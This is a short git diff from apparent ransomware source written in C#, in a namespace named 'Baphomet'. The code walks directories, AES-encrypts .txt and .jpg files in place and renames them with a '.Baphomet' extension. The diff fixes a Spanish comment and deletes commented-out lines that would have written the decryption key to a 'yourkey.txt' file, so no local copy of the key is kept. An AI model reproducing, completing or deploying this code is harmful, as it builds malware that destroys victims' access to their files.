@@ -23,7 +23,7 @@ namespace Baphomet
             return res.ToString();
         }
 
-        //recoro los directorios
+        //recorro los directorios
         public void directoryRoad(string targetPath, string key)
         {
             var extensionCheck = new[] { ".txt",".jpg" };//Extensiones validas
@@ -59,9 +59,6 @@ namespace Baphomet
             var encryptedBytes = UseAES(encryptFileBites, passwordBytes);
             File.WriteAllBytes(file, encryptedBytes);
             System.IO.File.Move(file, file + ".Baphomet");
-
-            //var saveKey = Convert.ToBase64String(key,0,key.Length);
-           // File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);
 
         }
 
